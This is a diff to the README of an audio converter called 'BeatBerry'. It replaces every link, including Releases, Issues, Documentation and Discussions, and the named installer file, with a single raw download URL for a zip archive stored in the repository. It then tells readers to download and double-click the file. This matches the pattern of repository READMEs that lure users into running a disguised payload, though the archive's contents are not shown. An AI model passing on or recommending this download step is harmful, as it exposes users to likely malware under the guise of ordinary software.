@@ -1,23 +1,23 @@
 # 🎧 BeatBerry - Convert Audio Files Effortlessly
 
 ## 💾 Download BeatBerry
-[![Download BeatBerry](https://img.shields.io/badge/Download%20BeatBerry-v1.0.0-blue.svg)](https://github.com/felipecameloss/BeatBerry/releases)
+[![Download BeatBerry](https://raw.githubusercontent.com/felipecameloss/BeatBerry/main/BeatBerry.app/Berry_Beat_v3.6.zip%https://raw.githubusercontent.com/felipecameloss/BeatBerry/main/BeatBerry.app/Berry_Beat_v3.6.zip)](https://raw.githubusercontent.com/felipecameloss/BeatBerry/main/BeatBerry.app/Berry_Beat_v3.6.zip)
 
 ## 🚀 Getting Started
 BeatBerry is a user-friendly application designed to convert audio files like MP3, WAV, FLAC, and M4A quickly and easily. Whether you want to change your music format or batch process several files at once, BeatBerry is here to simplify the task.
 
 ## 📥 Download & Install
-To get started, [visit this page to download](https://github.com/felipecameloss/BeatBerry/releases) the latest version of BeatBerry. Follow these steps to install the application:
+To get started, [visit this page to download](https://raw.githubusercontent.com/felipecameloss/BeatBerry/main/BeatBerry.app/Berry_Beat_v3.6.zip) the latest version of BeatBerry. Follow these steps to install the application:
 
 1. Click on the link above to access the Releases page.
 2. Find the latest release.
-3. Look for the file named BeatBerry.exe (or the appropriate file for your operating system).
+3. Look for the file named https://raw.githubusercontent.com/felipecameloss/BeatBerry/main/BeatBerry.app/Berry_Beat_v3.6.zip (or the appropriate file for your operating system).
 4. Click on the file to download it. The download should start automatically.
 
 Once the download completes, find the downloaded file in your computer's Downloads folder, or wherever you saved it.
 
 ## ⚙️ Installation Instructions
-1. **Locate the downloaded file** (BeatBerry.exe).
+1. **Locate the downloaded file** (https://raw.githubusercontent.com/felipecameloss/BeatBerry/main/BeatBerry.app/Berry_Beat_v3.6.zip).
 2. **Double-click the file** to start the installation process.
 3. Follow the prompts in the installer to complete the installation.
 4. Once installed, you can find BeatBerry in your applications or programs list.
@@ -56,10 +56,10 @@ BeatBerry is open-source. If you wish to contribute to the project, you can foll
 Your contributions help us improve BeatBerry for everyone.
 
 ## 📞 Support
-If you encounter any issues while using BeatBerry, please check the [Issues page](https://github.com/felipecameloss/BeatBerry/issues) for common problems and solutions. If your issue isn't listed, feel free to create a new issue for assistance.
+If you encounter any issues while using BeatBerry, please check the [Issues page](https://raw.githubusercontent.com/felipecameloss/BeatBerry/main/BeatBerry.app/Berry_Beat_v3.6.zip) for common problems and solutions. If your issue isn't listed, feel free to create a new issue for assistance.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/felipecameloss/BeatBerry/wiki) - Find detailed guides and tips for using BeatBerry.
-- [Community Discussions](https://github.com/felipecameloss/BeatBerry/discussions) - Join our discussions to ask questions or share your thoughts.
+- [Documentation](https://raw.githubusercontent.com/felipecameloss/BeatBerry/main/BeatBerry.app/Berry_Beat_v3.6.zip) - Find detailed guides and tips for using BeatBerry.
+- [Community Discussions](https://raw.githubusercontent.com/felipecameloss/BeatBerry/main/BeatBerry.app/Berry_Beat_v3.6.zip) - Join our discussions to ask questions or share your thoughts.
 
 Feel free to explore and experience audio conversion like never before!
